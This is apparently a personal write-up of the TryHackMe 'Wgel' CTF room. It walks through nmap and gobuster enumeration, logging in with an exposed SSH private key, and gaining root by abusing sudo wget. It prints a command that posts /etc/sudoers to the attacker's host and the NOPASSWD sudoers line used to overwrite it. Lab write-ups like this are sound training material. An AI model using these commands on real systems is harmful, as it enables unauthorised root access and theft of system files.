---
title: Wgel Writeup
published: 2026-03-22
description: Writeup of an easy room by TryHackMe.
tags: [Writeup, Easy, TryHackMe]
category: TryHackMe
draft: false
---

### Let's try a new lab on tryhackme named wgel ctf.
### First start by adding the ip to hosts file to not remember the ip everytime.

## Let's start the enumeration with a nmap scan.
```
──(igris㉿kali)-[~/Desktop/wgel]
└─$ nmap -sV wgel.thm     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 07:56 EDT
Nmap scan report for wgel.thm (10.201.22.98)
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds
```
### Only 2 ports are open ssh and http. So let's visit the website.
<img width="1432" height="1390" alt="image" src="https://github.com/GamerPrajun/Tryhackme/blob/main/assets/images/wgel%20images/apache.png?raw=true" />

### It is the default apache ubuntu page. 


### Looking at the source code i found something interesting.
<img width="952" height="500" alt="image" src="https://github.com/GamerPrajun/Tryhackme/blob/main/assets/images/wgel%20images/source.png?raw=true" />

### Now i couldnt find anything else so i decided to run gobuster to search for directories.
```
┌──(igris㉿kali)-[~/Desktop/wgel]
└─$ gobuster dir -u http://wgel.thm/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://wgel.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 273]
/sitemap              (Status: 301) [Size: 306] [--> http://wgel.thm/sitemap/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```
### I found a directory named sitemap which looked really nice and well made with css and all that fancy stuff. 
### Now I ran another gobuster search to find sub directories within sitemap.

<img width="1130" height="514" alt="image" src="https://github.com/GamerPrajun/Tryhackme/blob/main/assets/images/wgel%20images/ssh.png?raw=true" />

### WOW we find a .ssh directory and id_rsa file. Now I thought it was pretty easy from now on. I knew a username from the source page and tried to login to ssh with the private key.
### First i needed to give id_rsa enough permission and voila we are in as jessie.
.
<img width="1166" height="588" alt="image" src="https://github.com/GamerPrajun/Tryhackme/blob/main/assets/images/wgel%20images/jessie.png?raw=true" />

### I used locate to locate the flag and now it is time for privilege escalation and getting root.
```
jessie@CorpOne:~$ locate user | grep -i flag
/home/jessie/Documents/user_flag.txt
jessie@CorpOne:~$ cat /home/jessie/Documents/user_flag.txt 
{REDACTED}
jessie@CorpOne:~$ 
```

### Running sudo -l we can see that jessie can use wget with sudo.
```
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
jessie@CorpOne:~$
```

### I searched in gtfobins on how to abuse this and found a way to get root.
<img width="910" height="231" alt="image" src="https://github.com/GamerPrajun/Tryhackme/blob/main/assets/images/wgel%20images/gtfobin.png?raw=true" />

### I tried this method but the wget version was too low or different and didnt work. I did some digging and found that i could add a reverse shell with wget. I could then add it as a cronjob and get a reverse shell maybe. So lets try that.
### Ok that didnt work either but i found a new way to get root. I could use wget to like overwrite the sudoers file and add jessie to that and he could run sudo ig. 
### I am about to try that lets see..

### First I need to post this to my kali machine and edit the file i found out you can post any file with wget using command
### wget --post-file=/etc/sudoers http://"my ip"/

### Before this i set up a netcat listener and ran the command and we got the contents of the file. Now need to edit this and send it back to the machine.

```
jessie  ALL=(ALL) NOPASSWD: ALL
```
### I changed this and uploaded to the machine in the etc folder so that it overwrites the old sudoers file.

### And just like that i got root 
```
root@CorpOne:~# whoami
root
root@CorpOne:~# ls -la
total 28
drwx------  4 root root 4096 oct 26  2019 .
drwxr-xr-x 23 root root 4096 oct 26  2019 ..
-rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
drwx------  2 root root 4096 feb 27  2019 .cache
drwxr-xr-x  2 root root 4096 oct 26  2019 .nano
-rw-r--r--  1 root root  148 aug 17  2015 .profile
-rw-r--r--  1 root root   33 oct 26  2019 root_flag.txt
root@CorpOne:~# cat root_flag.txt 
{REDACTED}
root@CorpOne:~# 
```

### This was really fun and i learned a lot.